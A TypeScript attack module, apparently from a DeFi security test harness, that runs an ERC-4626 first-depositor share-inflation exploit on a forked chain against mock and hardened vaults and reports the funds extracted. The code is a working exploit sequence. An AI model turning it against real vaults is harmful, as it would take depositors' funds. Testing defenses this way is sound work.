import { parseEther, maxUint256 } from "viem";
import type { AttackModule, ModuleResult, RunOptions } from "../types";
import type { ForkRunner } from "../fork";
import { deploy, send, read, toUsd } from "../evm";

const M20 = "MockERC20.sol";
const M20N = "MockERC20";

export const shareInflationModule: AttackModule = {
  name: "share-inflation",
  async run(fork: ForkRunner, opts?: RunOptions): Promise<ModuleResult> {
    const hardened = opts?.hardened ?? false;
    const VLT = hardened ? "HardenedVault4626.sol" : "Vault4626.sol";
    const VLTN = hardened ? "HardenedVault4626" : "Vault4626";

    const deployer = fork.wallet(0);
    const atk = fork.wallet(1);
    const victim = fork.wallet(2);
    const a = atk.account.address;
    const v = victim.account.address;

    const usdc = await deploy(deployer, M20, M20N, ["USDC", "USDC"]);
    const vault = await deploy(deployer, VLT, VLTN, [usdc]);

    const donation = parseEther("100000");
    const victimDeposit = parseEther("100000");

    await send(deployer, usdc, M20, M20N, "mint", [a, donation + 1n]);
    await send(deployer, usdc, M20, M20N, "mint", [v, victimDeposit]);
    const before = await read<bigint>(fork, usdc, M20, M20N, "balanceOf", [a]);

    try {
      await send(atk, usdc, M20, M20N, "approve", [vault, maxUint256]);
      await send(atk, vault, VLT, VLTN, "deposit", [1n, a]);
      await send(atk, usdc, M20, M20N, "transfer", [vault, donation]);

      await send(victim, usdc, M20, M20N, "approve", [vault, maxUint256]);
      await send(victim, vault, VLT, VLTN, "deposit", [victimDeposit, v]);
      const victimShares = await read<bigint>(fork, vault, VLT, VLTN, "balanceOf", [v]);

      await send(atk, vault, VLT, VLTN, "redeem", [1n, a, a]);

      const after = await read<bigint>(fork, usdc, M20, M20N, "balanceOf", [a]);
      const profit = after > before ? after - before : 0n;
      return {
        name: "share-inflation",
        success: profit > 0n && victimShares === 0n,
        extractedUsd: toUsd(profit),
        note: "first-depositor rounding: victim shares floored to zero, deposit captured"
      };
    } catch {
      return { name: "share-inflation", success: false, extractedUsd: 0, note: "blocked by target protection" };
    }
  }
};
